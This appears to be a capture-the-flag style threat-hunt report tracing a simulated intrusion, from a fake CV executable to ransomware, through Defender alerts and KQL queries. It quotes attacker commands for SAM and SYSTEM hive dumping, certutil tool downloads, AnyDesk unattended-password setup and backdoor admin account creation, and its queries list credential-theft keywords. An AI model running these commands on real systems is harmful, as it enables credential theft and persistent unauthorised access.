# 🔍 Threat Hunt Report: Full Incident Investigation

**Analyst:** Chukwuebuka | SOC Analyst Intern — Log'n Pacific

**Date:** January 2026

**Classification:** CONFIDENTIAL

**Environment:** Azure-hosted Windows domain (AS-PC1, AS-PC2, AS-SRV)

**Tools Used:** Microsoft Defender for Endpoint (MDE), Microsoft Sentinel (Log Analytics), KQL

<img width="683" height="1024" alt="image" src="https://github.com/user-attachments/assets/9bdbf390-c4e6-4cea-bdac-589c4320a820" />


---

## 📋 Executive Summary

This report documents a comprehensive threat hunt investigation into a multi-stage intrusion across a Windows domain environment hosted in Azure. The attack began with a social engineering lure, a malicious executable disguised as a CV which then escalated through credential theft, lateral movement, data exfiltration, and ultimately ransomware deployment (Akira).

The threat actor compromised user **sophie.turner** on **AS-PC1** via a weaponised file (`Daniel_Richardson_CV.pdf.exe`), performed credential dumping, moved laterally to **AS-PC2** and **AS-SRV** using stolen credentials, accessed sensitive BACS payroll data, staged and exfiltrated business files, and cleared logs to cover their tracks. Fileless techniques including reflective .NET assembly loading and process hollowing were used throughout.

**Key Findings:**
- 🎯 Initial vector: Double-extension executable masquerading as a PDF CV
- 🔑 Credential theft via SAM/SYSTEM hive dumping and SharpChrome browser credential extraction
- 🖥️ Lateral movement across 3 hosts using RDP (mstsc.exe) after failed WMIC/PsExec attempts
- 💰 Sensitive BACS payroll data accessed, archived, and exfiltrated
- 🔒 Akira ransomware deployed in the final stage
- 🧹 Anti-forensics: Event logs cleared, fileless tools loaded reflectively into memory

---

## 🏗️ Environment Overview

| Host | Role | Key Users |
|------|------|-----------|
| AS-PC1 | Workstation (Initial Compromise) | sophie.turner |
| AS-PC2 | Workstation (Lateral Movement Target) | david.mitchell |
| AS-SRV | Domain Server / File Server | as.srv.administrator |

---

## 📅 Attack Timeline Overview

```
Jan 15, 03:31 AM ──── Initial execution of Daniel_Richardson_CV.pdf.exe (AS-PC1)
Jan 15, 03:47 AM ──── First C2 callback to cdn.cloud-endpoint.net
Jan 15, 04:08 AM ──── AnyDesk downloaded via certutil for persistence
Jan 15, 04:11 AM ──── AnyDesk configured with password "intrud3r!"
Jan 15, 04:13 AM ──── SAM & SYSTEM hive credential dumping
Jan 15, 04:18 AM ──── WMIC lateral movement attempts to AS-PC2 (failed)
Jan 15, 04:24 AM ──── PsExec downloaded from Sysinternals (failed)
Jan 15, 04:54 AM ──── Payload staged to AS-PC2 via sync.cloud-endpoint.net
Jan 15, 04:57 AM ──── Backdoor account svc_backup created
Jan 15, 05:09 AM ──── Process hollowing: SharpChrome injected into notepad.exe
Jan 15, ~04:43 AM ─── BACS payroll file accessed from AS-PC2
Jan 15, 04:59 AM ──── C:\Shares archived into Shares.7z
Jan 27, 22:24 PM ──── exfil_data.zip created by st.exe (exfiltration)
Jan 28, 02:52 AM ──── Akira ransomware encryption observed (.akira extension)
```

---

## 🔬 Detailed Findings — Flag by Flag

---

### SECTION 1: INITIAL ACCESS 🚪

---

#### Flag 1: Initial Vector

**❓ Question:** What malicious file started the attack?

**✅ Answer:** `Daniel_Richardson_CV.pdf.exe`

**🔎 How it was found:** MDE Alert, reviewed alerts on device AS-PC1 associated with user sophie.turner. The alert titled *"Daniel_Richardson_CV.pdf.exe performed system information discovery by invoking wevtutil.exe"* revealed the full process tree.

<img width="775" height="708" alt="image" src="https://github.com/user-attachments/assets/90e6defb-cd95-4b2f-9687-ba9e0650f574" />


**📝 Analysis:**
The malicious executable used a double extension technique (`.pdf.exe`) to masquerade as a legitimate CV document (MITRE T1036.007: Double File Extension). It was located in `C:\Users\Sophie.Turner\Downloads\Daniel_Richardson_CV\`, had an unknown signer, and a VirusTotal detection ratio of 0/0 at execution time,  suggesting custom-built malware designed to evade signature-based detection. The file was executed on Jan 15, 2026 at 3:31:53 AM via a remote session originating from 10.0.8.6 (Guacamole RDP). This was the file that initiated the entire infection chain.

---

#### Flag 2: Payload Hash

**❓ Question:** What is the SHA256 hash of the malicious file?

**✅ Answer:** `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`

**🔎 How it was found:** MDE Alert, extracted from the process entity graph for `Daniel_Richardson_CV.pdf.exe` (PID 4948).

<img width="720" height="780" alt="image" src="https://github.com/user-attachments/assets/c25b90f7-8e3e-47d2-91f0-bd1bd454c07d" />


**📝 Analysis:**
The SHA256 hash was listed in the process details within the same alert used for Flag 1. The file had an unknown signer and a VT detection ratio of 0/0 at execution time, indicating it was either novel or custom-built malware. This hash becomes important later in the investigation (Flag 30) when we discover the same binary was reused as a persistence payload under a different name.

---

#### Flag 3: User Interaction

**❓ Question:** What parent process confirms the user manually executed the file?

**✅ Answer:** `explorer.exe`

**🔎 How it was found:** MDE Alert, identified from the process entity graph.

<img width="769" height="889" alt="image" src="https://github.com/user-attachments/assets/8ca35bcd-fe8e-47a6-ae8e-9807315e3db3" />


**📝 Analysis:**
The alert process tree showed the chain `userinit.exe → explorer.exe → Daniel_Richardson_CV.pdf.exe`. The parent process `explorer.exe` (PID 4268) confirms the payload was launched via direct user interaction, sophie.turner manually double-clicked the disguised executable from her Downloads folder, believing it to be a legitimate PDF CV (MITRE T1204.002: User Execution - Malicious File). The session originated from remote IP 10.0.8.6 via Guacamole RDP.

---

#### Flag 4: Suspicious Child Process

**❓ Question:** What child process did the malware spawn?

**✅ Answer:** `notepad.exe`

**🔎 How it was found:** MDE Alert,  *"Daniel_Richardson_CV.pdf.exe remotely create a thread in its child process notepad.exe"*

<img width="847" height="864" alt="image" src="https://github.com/user-attachments/assets/cccf93e4-bcb3-4b53-94de-9231f5f616c8" />


**📝 Analysis:**
The payload spawned `notepad.exe` (PID 5556) at Jan 15, 2026 5:09:53 AM and performed process hollowing (MITRE T1055.012), along with DLL injection (T1055.001) and PE injection (T1055.002). The command line `notepad.exe ""` is abnormal, legitimate notepad usage would either have no arguments or a filename. The attacker used this technique to inject malicious code into a trusted, signed Windows process, allowing further activity to operate under the guise of notepad.exe and evade behavioural detection.

---

#### Flag 5: Suspicious Command Line

**❓ Question:** What was the suspicious command line?

**✅ Answer:** `notepad.exe ""`

**🔎 How it was found:** MDE Alert — process entity graph for notepad.exe (PID 5556).

<img width="720" height="718" alt="image" src="https://github.com/user-attachments/assets/fd31891d-52b9-4b40-adaf-91eab37c52aa" />


**📝 Analysis:**
Launching notepad with an empty string argument is a hallmark of process hollowing, the process is spawned in a suspended state, its memory is replaced with malicious code, and execution resumes. This gave the attacker a hollowed-out trusted process to operate from, blending malicious activity into what appears to be a benign Windows process. Any analyst reviewing running processes would see `notepad.exe` and likely not investigate further.

---

### SECTION 2: COMMAND & CONTROL 📡

---

#### Flag 6: C2 Domain
**❓ Question:** What domain did the malware communicate with for C2?

**✅ Answer:** `cdn.cloud-endpoint.net`

**🔎 How it was found:** KQL Query

```kql
DeviceNetworkEvents
| where DeviceName == "as-pc1"
| where TimeGenerated between (datetime(2026-01-15T05:09:00Z) .. datetime(2026-01-15T06:00:00Z))
| where RemoteUrl != ""
| project TimeGenerated, InitiatingProcessFileName, RemoteUrl, RemoteIP, RemotePort
| sort by TimeGenerated asc
```

<img width="1318" height="267" alt="image" src="https://github.com/user-attachments/assets/4a4eb415-7f8c-4b60-b060-1f2850ebf9df" />


**📝 Analysis:**
The malicious payload made outbound HTTP connections to `cdn.cloud-endpoint.net`, first observed at 5:15:37 AM over port 80 (HTTP) to IP 104.21.30.237, with a second connection at 5:21:38 AM resolving to 172.67.174.46. The domain uses a deceptive naming convention designed to blend in with legitimate CDN infrastructure traffic. The use of port 80 (unencrypted HTTP) rather than 443 (HTTPS) is notable, it may indicate the attacker prioritised simplicity over encryption, or was using HTTP for initial staging before switching protocols. The domain was not contacted by any legitimate process on the device, confirming it as dedicated adversary C2 infrastructure.

---

#### Flag 7: C2 Process
**❓ Question:** Which process initiated the C2 communications?

**✅ Answer:** `daniel_richardson_cv.pdf.exe`

**🔎 How it was found:** KQL Query

```kql
DeviceNetworkEvents
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName in ("notepad.exe", "daniel_richardson_cv.pdf.exe")
| where RemoteUrl !endswith "microsoft.com"
| project Timestamp, InitiatingProcessFileName, RemoteUrl, RemoteIP, RemotePort
| sort by Timestamp asc
```

<img width="1377" height="381" alt="image" src="https://github.com/user-attachments/assets/dc602a22-1b07-4a75-97f9-8dc87d2e6792" />


**📝 Analysis:**
All outbound C2 connections were initiated exclusively by `daniel_richardson_cv.pdf.exe`. Six connections were observed spanning from 3:47:10 AM to 7:31:48 AM, communicating over both port 443 (HTTPS) and port 80 (HTTP) to three distinct IPs, 104.21.30.237, 172.67.174.46, and 172.64.80.1. The rotation across multiple IPs suggests the C2 domain uses Cloudflare or similar CDN infrastructure for resilience. Despite the attacker performing process hollowing into notepad.exe, the C2 communications remained tied to the original malicious executable throughout.

---

#### Flag 8: Staging Infrastructure
**❓ Question:** What domain was used to stage additional payloads?

**✅ Answer:** `sync.cloud-endpoint.net`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where DeviceName == "as-pc2"
| where ProcessCommandLine has_any ("http://", "https://", "urlcache", "DownloadFile",
  "DownloadString", "Invoke-WebRequest", "Start-BitsTransfer")
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by TimeGenerated asc
```

<img width="1752" height="354" alt="image" src="https://github.com/user-attachments/assets/95947a06-90ce-4e1e-9b13-521e0c3424d8" />


**📝 Analysis:**
The attacker used WMIC from AS-PC1 at 4:54:50 AM to remotely execute certutil on AS-PC2 (10.1.0.203), downloading a payload from `https://sync.cloud-endpoint.net/` disguised as RuntimeBroker.exe. This is a separate attacker-controlled domain used exclusively for hosting additional payloads, distinct from the C2 domain `cdn.cloud-endpoint.net`. The naming convention (`sync` vs `cdn` under the same `cloud-endpoint.net` parent domain) indicates the adversary maintained segmented infrastructure, one domain for command and control and another for payload staging and tool distribution (MITRE T1105: Ingress Tool Transfer).

---

### SECTION 3: CREDENTIAL ACCESS 🔑

---

#### Flag 9: Registry Targets
**❓ Question:** Which registry hives were dumped?

**✅ Answer:** `SAM, SYSTEM`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where DeviceName == "as-pc1"
| where ProcessCommandLine has_any ("reg save", "reg.exe save", "hklm\\sam",
  "hklm\\security", "hklm\\system", "sekurlsa", "lsadump")
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by TimeGenerated asc
```

<img width="1245" height="501" alt="image" src="https://github.com/user-attachments/assets/508c64d7-ef17-4aeb-a1fc-143d37b8fa2b" />


**📝 Analysis:**
At 4:13:32 AM, the attacker used `reg.exe` via PowerShell to dump two registry hives from AS-PC1. The first command `reg.exe save HKLM\SAM C:\Users\Public\sam.hiv` exported the Security Account Manager database containing local user password hashes. The second command exported the SYSTEM hive which contains the boot key (SYSKEY) needed to decrypt the SAM hashes. With these two hives combined, the attacker can extract all local account NTLM hashes offline using tools like secretsdump.py or mimikatz (MITRE T1003.002: Security Account Manager).

---

#### Flag 10: Local Staging
**❓ Question:** Where were the dumped hives saved?

**✅ Answer:** `C:\Users\Public\`

**🔎 How it was found:** Identified from the `reg.exe` command lines in the Flag 9 query results.

<img width="1153" height="445" alt="image" src="https://github.com/user-attachments/assets/0b900295-0f98-4f8c-a62b-8eb011bc3b32" />


**📝 Analysis:**
The attacker saved both dumped registry hives to `C:\Users\Public\`. This directory is world-writable and accessible to all users on the system, making it a common staging ground for attackers (MITRE T1074.001: Local Data Staging). By placing the credential files here, the attacker ensured easy access for subsequent exfiltration without needing to navigate user-specific permission restrictions.

---

#### Flag 11: Execution Identity
**❓ Question:** Which user account performed the credential dumping?

**✅ Answer:** `sophie.turner`

**🔎 How it was found:** Process tree context from earlier flags.


**📝 Analysis:**
The credential extraction was performed under the sophie.turner user context. The attack chain flowed from `daniel_richardson_cv.pdf.exe → powershell.exe → reg.exe`, all executing under Sophie.Turner's session which originated via Guacamole RDP from 10.0.8.6. Since the attacker gained initial access by having Sophie.Turner double-click the disguised payload, all subsequent child processes inherited her user token and privileges.

---

### SECTION 4: DISCOVERY 🔭

---

#### Flag 12: User Context
**❓ Question:** What command did the attacker use to check their identity?

**✅ Answer:** `whoami`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where DeviceName == "as-pc1"
| where ProcessCommandLine has_any ("whoami", "net view", "net share", "net localgroup",
  "net group", "net user", "ipconfig", "systeminfo", "hostname", "nltest", "arp", "nbtstat")
| where InitiatingProcessFileName in ("cmd.exe", "powershell.exe",
  "daniel_richardson_cv.pdf.exe")
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by TimeGenerated asc
```

<img width="1242" height="445" alt="image" src="https://github.com/user-attachments/assets/c087be09-fd39-4f97-a96d-2ce2aeb0cc74" />


**📝 Analysis:**
After establishing initial access, the attacker executed `whoami` to confirm their identity and privilege level on the compromised system. This is a standard first step in post-exploitation reconnaissance (MITRE T1033: System Owner/User Discovery), allowing the attacker to verify they were operating as sophie.turner with the expected permissions before proceeding with further actions.

---

#### Flag 13: Network Enumeration
**❓ Question:** What command was used to discover network shares?

**✅ Answer:** `net view`

**🔎 How it was found:** Same KQL query as Flag 12.


**📝 Analysis:**
The attacker executed `net view` to enumerate available network shares and resources visible from AS-PC1 (MITRE T1135: Network Share Discovery). This command reveals shared folders across the network, helping the attacker identify potential lateral movement targets, file servers, and data repositories worth pursuing. This reconnaissance directly informed the attacker's subsequent lateral movement to AS-PC2 and eventually AS-SRV.

---

#### Flag 14: Local Admins
**❓ Question:** What group did the attacker enumerate for privileged accounts?

**✅ Answer:** `Administrators`

**🔎 How it was found:** Same KQL query as Flag 12.


**📝 Analysis:**
The attacker enumerated the local Administrators group using `net localgroup Administrators` to identify privileged accounts on AS-PC1 (MITRE T1069.001: Permission Groups Discovery - Local Groups). This discovery step reveals which accounts have elevated access, helping the attacker understand the privilege landscape. Notably, the attacker later added their own backdoor account `svc_backup` to this same Administrators group at 4:57:50 AM, demonstrating how discovery directly fed into privilege escalation.

---

### SECTION 5: PERSISTENCE 🔒

---

#### Flag 15: Remote Tool
**❓ Question:** What legitimate remote access tool was abused for persistence?

**✅ Answer:** `AnyDesk`

**🔎 How it was found:** MDE Alert / Process command lines from earlier investigation.

<img width="768" height="658" alt="image" src="https://github.com/user-attachments/assets/66dd5445-fe55-403e-bbb3-5154484956f0" />


**📝 Analysis:**
The attacker deployed AnyDesk, a legitimate remote administration tool, as a persistence mechanism (MITRE T1219: Remote Access Software). AnyDesk was downloaded to `C:\Users\Public\AnyDesk.exe` and configured for unattended access, providing the attacker with a reliable backdoor independent of the initial payload. This is a classic example of abusing trusted tools to maintain access while blending in with legitimate software.

---

#### Flag 16: Remote Tool Hash
**❓ Question:** What is the SHA256 hash of the remote tool binary?

**✅ Answer:** `f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532`

**🔎 How it was found:** KQL Query

```kql
DeviceFileEvents
| where DeviceName == "as-pc1"
| where FileName =~ "AnyDesk.exe"
| project TimeGenerated, FileName, FolderPath, SHA256, InitiatingProcessFileName
| sort by TimeGenerated asc
```

<img width="1513" height="300" alt="image" src="https://github.com/user-attachments/assets/83d40bfc-68dd-4c17-ace4-fbef9bf6af05" />


**📝 Analysis:**
The SHA256 hash was extracted from the DeviceFileEvents table for the AnyDesk.exe binary written to `C:\Users\Public\` on AS-PC1. The file was downloaded via certutil from `download.anydesk.com`, meaning this is a legitimate AnyDesk binary — the attacker did not modify the executable itself but instead weaponised it through configuration by setting an unattended access password.

---

#### Flag 17: Download Method
**❓ Question:** What tool was used to download the remote access software?

**✅ Answer:** `certutil.exe`

**🔎 How it was found:** Command line evidence from Flag 8 investigation.

<img width="1234" height="268" alt="image" src="https://github.com/user-attachments/assets/33d5ed0c-a3df-4e3d-aff7-2d8a2de772c4" />


**📝 Analysis:**
The attacker used `certutil.exe` with the command `certutil -urlcache -split -f https://download.anydesk.com/AnyDesk.exe C:\Users\Public\AnyDesk.exe` at 4:08:29 AM. Certutil is a native Windows certificate utility commonly abused as a LOLBin (Living Off the Land Binary) for file downloads (MITRE T1105: Ingress Tool Transfer). Its presence on all Windows systems and its trusted status make it an effective tool for bypassing application whitelisting and security controls.

---

#### Flag 18: Configuration Access
**❓ Question:** What configuration file was accessed?

**✅ Answer:** `C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf`

**🔎 How it was found:** MDE Alert — process tree.

<img width="738" height="570" alt="image" src="https://github.com/user-attachments/assets/bd2090a7-a4fc-4478-bdf7-902c421436ba" />


**📝 Analysis:**
At 4:11:13 AM, the attacker ran `cmd.exe /c "type C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf"` to read the AnyDesk configuration file. This file contains the AnyDesk ID and connection settings for the local installation. By reading this file, the attacker retrieved the unique AnyDesk address needed to connect remotely to AS-PC1, which was necessary before configuring unattended access with a password.

---

#### Flag 19: Access Credentials
**❓ Question:** What password was configured for unattended access?

**✅ Answer:** `intrud3r!`

**🔎 How it was found:** MDE Alert — process tree.

<img width="762" height="568" alt="image" src="https://github.com/user-attachments/assets/b4feffad-08d2-4850-8c5d-0ea74882b0a6" />


**📝 Analysis:**
At 4:11:47 AM, the attacker executed `echo intrud3r! | C:\Users\Public\AnyDesk.exe --set-password` to configure unattended access on the AnyDesk installation. This command pipes the password into AnyDesk's password configuration, enabling anyone with the AnyDesk ID and this password to connect remotely without user approval. This established a persistent backdoor completely independent of the original malware, ensuring continued access even if the initial payload was detected and removed.

---

#### Flag 20: Deployment Footprint
**❓ Question:** Which devices had AnyDesk deployed?

**✅ Answer:** `AS-PC1, AS-PC2, AS-SRV`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where ProcessCommandLine has "AnyDesk"
| summarize by DeviceName
```

<img width="750" height="363" alt="image" src="https://github.com/user-attachments/assets/4a39cded-fabf-4522-b193-345fa1480d3f" />


**📝 Analysis:**
AnyDesk was deployed across all three hosts in the environment. On AS-PC1, it was downloaded directly via certutil and configured with unattended access. On AS-PC2, it was pushed remotely using WMIC with certutil from AS-PC1 at 4:18:44 AM. On AS-SRV, it was also deployed as part of the attacker's broader persistence strategy. The deployment across three machines demonstrates the attacker's intent to establish multiple redundant access points throughout the network, ensuring persistence even if one host was remediated.

---

### SECTION 6: LATERAL MOVEMENT 🕸️

---

#### Flag 21: Failed Execution
**❓ Question:** Which remote execution tools failed?

**✅ Answer:** `WMIC, PsExec`

**🔎 How it was found:** Command line evidence from prior investigation.

<img width="754" height="777" alt="image" src="https://github.com/user-attachments/assets/4188a000-e481-44c7-95be-6a32f50a7b5f" />


**📝 Analysis:**
The attacker attempted two remote execution methods that initially failed against AS-PC2. Multiple WMIC commands were executed from 4:18:44 AM onwards using `WMIC.exe /node:AS-PC2 /user:Administrator` to remotely deploy tools via certutil. PsExec was also downloaded from live.sysinternals.com at 4:24:16 AM and used to attempt remote execution. Both tools experienced failures before the attacker eventually achieved successful lateral movement through RDP. This trial-and-error pattern is characteristic of hands-on-keyboard intrusions where the attacker adapts in real-time.

---

#### Flag 22: Target Host
**❓ Question:** Which host was the target of the failed execution attempts?

**✅ Answer:** `AS-PC2`

**🔎 How it was found:** WMIC command lines referencing `/node:AS-PC2`.

<img width="785" height="534" alt="image" src="https://github.com/user-attachments/assets/3bd34b39-b9a2-444d-a714-f2af23ba0771" />


**📝 Analysis:**
All failed remote execution attempts were directed at AS-PC2 (10.1.0.203). The WMIC commands explicitly referenced this hostname, and PsExec connections were also directed there. AS-PC2 was the attacker's primary lateral movement target after compromising AS-PC1.

---

#### Flag 23: Successful Pivot
**❓ Question:** What tool was eventually used for successful lateral movement?

**✅ Answer:** `mstsc.exe`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where DeviceName in ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine has_any ("psexec", "wmic", "mstsc", "net use",
  "/active:yes", "schtasks")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine,
  InitiatingProcessFileName, InitiatingProcessAccountName
| sort by TimeGenerated asc
```

<img width="1689" height="537" alt="image" src="https://github.com/user-attachments/assets/73b1217d-2ced-402f-9b45-47ba7019be24" />


**📝 Analysis:**
After WMIC and PsExec failed, the attacker pivoted to using `mstsc.exe` (Microsoft Remote Desktop Client) for lateral movement (MITRE T1021.001: Remote Desktop Protocol). This native Windows RDP client provided a full interactive desktop session, giving the attacker direct GUI access to the target systems. Using RDP via mstsc.exe is a common fallback for attackers when command-line remote execution tools fail.

---

#### Flag 24: Movement Path
**❓ Question:** What was the lateral movement path?

**✅ Answer:** `AS-PC1 > AS-PC2 > AS-SRV`

**📝 Analysis:**
The attacker moved laterally in sequence: starting from AS-PC1 (initial compromise via sophie.turner), pivoting to AS-PC2 (targeted via WMIC/PsExec then RDP), and finally reaching AS-SRV (the file server containing sensitive data).

---

#### Flag 25: Compromised Account
**❓ Question:** Which account was used for lateral movement?

**✅ Answer:** `david.mitchell`

**🔎 How it was found:** Same KQL query as Flag 23.

<img width="1660" height="508" alt="image" src="https://github.com/user-attachments/assets/7440ee4b-2c3e-48d5-bac3-58c65bea15ca" />


**📝 Analysis:**
The attacker authenticated as `david.mitchell` for lateral movement. This account was likely compromised through the earlier credential dumping (SAM/SYSTEM hives) or via the SharpChrome browser credential theft performed by the hollowed notepad.exe process. The use of david.mitchell rather than sophie.turner indicates the attacker deliberately switched identities to broaden access and avoid relying solely on the initially compromised account.

---

#### Flag 26: Account Activation
**❓ Question:** What command parameter was used to enable a disabled account?

**✅ Answer:** `/active:yes`

**🔎 How it was found:** Same KQL query as Flag 23.

<img width="1723" height="349" alt="image" src="https://github.com/user-attachments/assets/337fd8a9-894c-40b8-8844-947a875586f5" />


**📝 Analysis:**
The attacker used `net.exe user <account> /active:yes` to enable a previously disabled account (MITRE T1098: Account Manipulation). Reactivating existing dormant accounts rather than creating new ones can be less conspicuous, as the account already exists in Active Directory and won't trigger new account creation alerts.

---

#### Flag 27: Activation Context
**❓ Question:** Under which user context was the account activation performed?

**✅ Answer:** `david.mitchell`

**🔎 How it was found:** Same KQL query as Flag 23.

**📝 Analysis:**
The account activation was performed under the david.mitchell context, confirming the attacker had already fully compromised this account. By using a legitimate privileged account to enable dormant accounts, the attacker chained credential access with account manipulation to expand their foothold, demonstrating a progression from initial compromise to credential theft to privilege escalation.

---

### SECTION 7: PERSISTENCE — SCHEDULED TASKS & BACKDOORS ⏰

---

#### Flag 28: Scheduled Persistence
**❓ Question:** What was the name of the scheduled task created for persistence?

**✅ Answer:** `MicrosoftEdgeUpdateCheck`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where DeviceName in ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine has_any ("schtasks /create", "schtasks.exe /create")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine,
  InitiatingProcessFileName, InitiatingProcessAccountName
| sort by TimeGenerated asc
```
<img width="1534" height="292" alt="image" src="https://github.com/user-attachments/assets/8720c66c-d686-4edc-bf25-26236128ef6c" />


**📝 Analysis:**
The attacker created a scheduled task named "MicrosoftEdgeUpdateCheck" for persistence (MITRE T1053.005: Scheduled Task). The name was deliberately chosen to mimic legitimate Microsoft Edge browser update activity, making it difficult to identify during routine system reviews. An admin checking scheduled tasks would likely overlook something named after a standard browser update.

---

#### Flag 29: Renamed Binary
**❓ Question:** What was the persistence payload renamed to?

**✅ Answer:** `RuntimeBroker.exe`

**🔎 How it was found:** Same KQL query as Flag 28 — the scheduled task command line referenced the binary.

<img width="1628" height="343" alt="image" src="https://github.com/user-attachments/assets/bf6c537e-c6d2-473e-b648-a028d31dc270" />


**📝 Analysis:**
The attacker renamed the persistence payload to `RuntimeBroker.exe`, impersonating the legitimate Windows Runtime Broker process (MITRE T1036.005: Match Legitimate Name or Location). The real RuntimeBroker.exe manages app permissions in Windows, making this an effective masquerading technique. This was the same payload staged from `sync.cloud-endpoint.net` onto AS-PC2 via the WMIC/certutil command at 4:54:50 AM.

---

#### Flag 30: Persistence Hash
**❓ Question:** What is the SHA256 hash of the persistence payload?

**✅ Answer:** `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`

**🔎 How it was found:** KQL Query

```kql
DeviceFileEvents
| where DeviceName in ("as-pc1", "as-pc2", "as-srv")
| where SHA256 == "48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5"
| project TimeGenerated, DeviceName, FileName, FolderPath, SHA256,
  InitiatingProcessFileName
| sort by TimeGenerated asc
```

<img width="1636" height="270" alt="image" src="https://github.com/user-attachments/assets/6fec5ff5-33ec-4289-ab13-e73a6f8760c9" />


**📝 Analysis:**
The persistence payload `RuntimeBroker.exe` shares the **exact same SHA256 hash** as the original `Daniel_Richardson_CV.pdf.exe` payload from the initial compromise. This confirms the attacker reused the same malicious binary — simply renaming it to blend in with legitimate Windows processes. This is a common approach where a single payload serves multiple purposes across the attack chain rather than deploying distinct binaries for each stage.

---

#### Flag 31: Backdoor Account
**❓ Question:** What local account was created as a backdoor?

**✅ Answer:** `svc_backup`

**🔎 How it was found:** MDE Alert — evidence at 4:57:47 AM.

<img width="690" height="466" alt="image" src="https://github.com/user-attachments/assets/ed394243-19a9-40a4-9f0f-7f9b9e5451db" />


**📝 Analysis:**
The attacker created a local account named `svc_backup` using `net.exe user svc_backup ********** /add` and immediately elevated it to the Administrators group with `net.exe localgroup Administrators svc_backup /add` (MITRE T1136.001: Create Account - Local Account). The naming convention mimics legitimate service accounts used for backup operations, making it less likely to raise suspicion during routine account audits. This provided yet another persistence mechanism, the attacker now had four independent access methods: the original payload, AnyDesk, the scheduled task, and the backdoor account.

---

### SECTION 8: DATA ACCESS 💰

---

#### Flag 32: Sensitive Document
**❓ Question:** What sensitive file was accessed on the file server?

**✅ Answer:** `BACS_Payments_Dec2025.ods`

**🔎 How it was found:** KQL Query

```kql
DeviceFileEvents
| where DeviceName == "as-srv"
| where FolderPath has "Shares"
| project TimeGenerated, DeviceName, FileName, FolderPath, SHA256, ActionType,
  InitiatingProcessFileName, InitiatingProcessAccountName
| sort by TimeGenerated asc
```

<img width="1549" height="328" alt="image" src="https://github.com/user-attachments/assets/bdc84ca3-e1e6-419a-b577-ae2d40f6da43" />


**📝 Analysis:**
The attacker located and accessed a BACS (Bankers' Automated Clearing Services) payment file stored at `C:\Shares\Payroll\BACS_Payments_Dec2025.ods` on AS-SRV. BACS is the UK electronic payment system used for payroll processing, direct debits, and bank transfers, making this file highly sensitive as it contains employee payment information for December 2025. The `.ods` format indicates the organisation was using LibreOffice for financial record-keeping. This file was the attacker's primary target within the Shares directory.

---

#### Flag 33: Modification Evidence
**❓ Question:** What file artifact proves the document was opened for editing?

**✅ Answer:** `.~lock.BACS_Payments_Dec2025.ods#`

**🔎 How it was found:** Same KQL query as Flag 32.

<img width="1564" height="390" alt="image" src="https://github.com/user-attachments/assets/5d71739b-817c-4c27-99aa-3465f3524322" />


**📝 Analysis:**
The presence of `.~lock.BACS_Payments_Dec2025.ods#` in `C:\Shares\Payroll\` proves the document was opened for editing, not just viewing. LibreOffice creates `.~lock` files whenever a document is actively opened for modification — this is the application's file-locking mechanism to prevent concurrent edits. Multiple lock file entries were observed between 04:44 and 04:47 UTC, along with temporary files (`lu54882cf85.tmp`, `BACS_Payments_Dec2025.ods~RF3e3904.TMP`), confirming the file was actively opened and saved multiple times.

---

#### Flag 34: Access Origin
**❓ Question:** Which workstation accessed the sensitive file?

**✅ Answer:** `as-pc2`

**🔎 How it was found:** KQL Query

```kql
DeviceFileEvents
| where DeviceName in ("as-pc1", "as-pc2", "as-srv")
| where FileName has "Payroll"
| project TimeGenerated, DeviceName, FileName, FolderPath, SHA256, ActionType,
  InitiatingProcessFileName, InitiatingProcessAccountName
| sort by TimeGenerated asc
```

<img width="1549" height="424" alt="image" src="https://github.com/user-attachments/assets/af8c918f-c90b-4e38-ac7f-f2818eccf324" />


**📝 Analysis:**
The BACS payment file was accessed from workstation **AS-PC2** by user **david.mitchell**. This was confirmed by the creation of `Payroll (AS-SRV).lnk` in `C:\Users\David.Mitchell\AppData\Roaming\Microsoft\Windows\Recent\` at 04:43 UTC. just one minute before the lock files appeared on AS-SRV at 04:44 UTC. Windows automatically creates `.lnk` files in the Recent folder whenever a user opens a file or folder, providing a reliable forensic artifact.

---

#### Flag 35: Exfil Archive
**❓ Question:** What archive was created to package data for exfiltration?

**✅ Answer:** `Shares.7z`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where DeviceName in ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine has_any ("7z", "zip", "rar", "tar", "compress", "archive")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine,
  InitiatingProcessFileName, InitiatingProcessAccountName
| sort by TimeGenerated asc
```

<img width="1639" height="387" alt="image" src="https://github.com/user-attachments/assets/99ee6518-dac8-4e65-9750-704315fa6bf0" />


**📝 Analysis:**
At 04:59 UTC, the `as.srv.administrator` account used `7zG.exe` (7-Zip GUI) to compress the entire `C:\Shares` directory into `C:\Shares.7z`. The command line `"7zG.exe" a -i#7zMap308:22:7zEvent6071 -t7z -sae -- "C:\Shares.7z"` confirms this was an interactive archival operation. The archive was subsequently moved to `C:\Shares\Clients\Shares.7z` and later deleted to the Recycle Bin — a classic staging-then-cleanup pattern (MITRE T1560.001: Archive Collected Data - Archive via Utility). This archive contained all sensitive business data including BACS payroll, client master lists, and contractor information.

---

#### Flag 36: Archive Hash
**❓ Question:** What is the SHA256 hash of the staged archive?

**✅ Answer:** `6886c0a2e59792e69df94d2cf6ae62c2364fda50a23ab44317548895020ab048`

**🔎 How it was found:** Same KQL query as Flag 32.

